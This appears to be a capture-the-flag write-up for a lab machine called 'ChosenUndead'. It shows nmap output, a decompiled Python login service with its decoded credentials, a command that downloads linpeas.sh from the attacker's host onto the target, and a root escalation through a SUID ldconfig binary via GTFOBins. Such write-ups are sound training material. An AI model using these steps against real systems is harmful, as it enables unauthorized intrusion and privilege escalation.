# ChosenUndead


## Enumeration
```bash
└─$ nmap -A -p- -T4 10.10.228.206
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-05-30 11:30 BST
Nmap scan report for 10.10.228.206
Host is up (0.033s latency).
Not shown: 65531 closed tcp ports (conn-refused)
PORT      STATE SERVICE VERSION
22/tcp    open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.10 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 9f:d0:bb:c7:e2:ee:7f:91:fe:c2:6a:a6:bb:b2:e1:91 (RSA)
|   256 06:4b:fe:c0:6e:e4:f4:7e:e1:db:1c:e7:79:9d:2b:1d (ECDSA)
|_  256 0d:0e:ce:57:00:1a:e2:8d:d2:1b:2e:6d:92:3e:65:c4 (ED25519)
11337/tcp open  http    Apache httpd 2.4.18 ((Ubuntu))
|_http-title: Apache2 Ubuntu Default Page: It works
|_http-server-header: Apache/2.4.18 (Ubuntu)
27777/tcp open  unknown
| fingerprint-strings: 
|   DNSStatusRequestTCP, DNSVersionBindReqTCP, GenericLines, GetRequest, HTTPOptions, RTSPRequest: 
|     Chosen Undead, who has rung the Bell of Awakening. I wish to elucidate your fate. Do you seek such enlightenment?If so, come forward, and tell me who you areUsername: Password:
|   NULL, RPCCheck: 
|_    Chosen Undead, who has rung the Bell of Awakening. I wish to elucidate your fate. Do you seek such enlightenment?If so, come forward, and tell me who you areUsername:
45454/tcp open  ftp     vsftpd 3.0.3
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
|_-rw-r--r--    1 ftp      ftp          1197 Mar 04  2022 lore.txt
| ftp-syst: 
|   STAT: 
| FTP server status:
|      Connected to ::ffff:10.8.37.214
|      Logged in as ftp
|      TYPE: ASCII
|      No session bandwidth limit
|      Session timeout in seconds is 300
|      Control connection is plain text
|      Data connections will be plain text
|      At session startup, client count was 3
|      vsFTPd 3.0.3 - secure, fast, stable
|_End of status
1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
SF-Port27777-TCP:V=7.94SVN%I=7%D=5/30%Time=6658553E%P=x86_64-pc-linux-gnu%
SF:r(NULL,A7,"Chosen\x20Undead,\x20who\x20has\x20rung\x20the\x20Bell\x20of
SF:\x20Awakening\.\x20I\x20wish\x20to\x20elucidate\x20your\x20fate\.\x20Do
SF:\x20you\x20seek\x20such\x20enlightenment\?If\x20so,\x20come\x20forward,
SF:\x20and\x20tell\x20me\x20who\x20you\x20areUsername:\x20")%r(GenericLine
SF:s,B1,"Chosen\x20Undead,\x20who\x20has\x20rung\x20the\x20Bell\x20of\x20A
SF:wakening\.\x20I\x20wish\x20to\x20elucidate\x20your\x20fate\.\x20Do\x20y
SF:ou\x20seek\x20such\x20enlightenment\?If\x20so,\x20come\x20forward,\x20a
SF:nd\x20tell\x20me\x20who\x20you\x20areUsername:\x20Password:\x20")%r(Get
SF:Request,B1,"Chosen\x20Undead,\x20who\x20has\x20rung\x20the\x20Bell\x20o
SF:f\x20Awakening\.\x20I\x20wish\x20to\x20elucidate\x20your\x20fate\.\x20D
SF:o\x20you\x20seek\x20such\x20enlightenment\?If\x20so,\x20come\x20forward
SF:,\x20and\x20tell\x20me\x20who\x20you\x20areUsername:\x20Password:\x20")
SF:%r(HTTPOptions,B1,"Chosen\x20Undead,\x20who\x20has\x20rung\x20the\x20Be
SF:ll\x20of\x20Awakening\.\x20I\x20wish\x20to\x20elucidate\x20your\x20fate
SF:\.\x20Do\x20you\x20seek\x20such\x20enlightenment\?If\x20so,\x20come\x20
SF:forward,\x20and\x20tell\x20me\x20who\x20you\x20areUsername:\x20Password
SF::\x20")%r(RTSPRequest,B1,"Chosen\x20Undead,\x20who\x20has\x20rung\x20th
SF:e\x20Bell\x20of\x20Awakening\.\x20I\x20wish\x20to\x20elucidate\x20your\
SF:x20fate\.\x20Do\x20you\x20seek\x20such\x20enlightenment\?If\x20so,\x20c
SF:ome\x20forward,\x20and\x20tell\x20me\x20who\x20you\x20areUsername:\x20P
SF:assword:\x20")%r(RPCCheck,A7,"Chosen\x20Undead,\x20who\x20has\x20rung\x
SF:20the\x20Bell\x20of\x20Awakening\.\x20I\x20wish\x20to\x20elucidate\x20y
SF:our\x20fate\.\x20Do\x20you\x20seek\x20such\x20enlightenment\?If\x20so,\
SF:x20come\x20forward,\x20and\x20tell\x20me\x20who\x20you\x20areUsername:\
SF:x20")%r(DNSVersionBindReqTCP,B1,"Chosen\x20Undead,\x20who\x20has\x20run
SF:g\x20the\x20Bell\x20of\x20Awakening\.\x20I\x20wish\x20to\x20elucidate\x
SF:20your\x20fate\.\x20Do\x20you\x20seek\x20such\x20enlightenment\?If\x20s
SF:o,\x20come\x20forward,\x20and\x20tell\x20me\x20who\x20you\x20areUsernam
SF:e:\x20Password:\x20")%r(DNSStatusRequestTCP,B1,"Chosen\x20Undead,\x20wh
SF:o\x20has\x20rung\x20the\x20Bell\x20of\x20Awakening\.\x20I\x20wish\x20to
SF:\x20elucidate\x20your\x20fate\.\x20Do\x20you\x20seek\x20such\x20enlight
SF:enment\?If\x20so,\x20come\x20forward,\x20and\x20tell\x20me\x20who\x20yo
SF:u\x20areUsername:\x20Password:\x20");
Service Info: OSs: Linux, Unix; CPE: cpe:/o:linux:linux_kernel
```

### Get the file in the ftp server 

### It's python compyle so i uncompyle it with online tool
uncompyle undead

#### File Content
```python
# uncompyle6 version 3.5.0
# Python bytecode 3.5 (3350)
# Decompiled from: Python 3.7.2 (default, Dec 29 2018, 06:19:36) 
# [GCC 7.3.0]
# Embedded file name: backdoor.py
# Compiled at: 2022-03-04 06:50:33
# Size of source mod 2**32: 1217 bytes
import socket, subprocess
from Crypto.Util.number import bytes_to_long
usern = 7875909265642786418784435790180
passw = 177384893720374260768013536878371736215604055656982064137546651747991645561
port = 27777
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.bind(('', port))
s.listen(10)

def secret():
    with open('secret.txt', 'r') as (f):
        reveal = f.read()
        return reveal


while True:
    try:
        conn, addr = s.accept()
        conn.send('Chosen Undead, who has rung the Bell of Awakening. I wish to elucidate your fate. Do you seek such enlightenment?')
        conn.send('If so, come forward, and tell me who you are')
        conn.send('Username: ')
        username = conn.recv(1024).decode('utf-8').strip()
        username = bytes(username, 'utf-8')
        conn.send('Password: ')
        password = conn.recv(1024).decode('utf-8').strip()
        password = bytes(password, 'utf-8')
        if bytes_to_long(username) == usern and bytes_to_long(password) == passw:
            directory = bytes(secret(), 'utf-8')
            conn.send(directory)
            conn.close()
        else:
            conn.send("Are thou not the chosen undead ? Speak truly now, don't waste my time")
            conn.close()
    except:
        continue
```
```bash
└─$ python script.py
b'chosen_undead'
b'descendant_of_the_furtive_pigmy'

Chosen Undead, who has rung the Bell of Awakening. I wish to elucidate your fate. Do you seek such enlightenment?If so, come forward, and tell me who you areUsername: chosen_undead
Password: descendant_of_the_furtive_pigmy
Very well. Then I am pleased to share. Chosen Undead. Your fate... is to succeed the Great Lord Gwyn. So that you may link the Fire, cast away the Dark, and undo the curse of the Undead. To this end, you must visit Anor Londo, and acquire the Lordvessel.

The path is anor_londo_city_of_gods.php
```
### Go to the path which is given in the script

### help website for Chosen Prefix Collision Attack

https://sha-mbles.github.io/

## Privilege Escalation

curl -O http://10.8.37.214:80/linpeas.sh

### linpeas gives me the vulnerability
```bash
-rwsr-xr-x 1 root root 978K Apr 21  2021 /sbin/ldconfig
```
### I use the GTFOBins Website to exploit the vulnerability, i just follow the instruction and i got a shell as root
gtfobins -> ldconfig
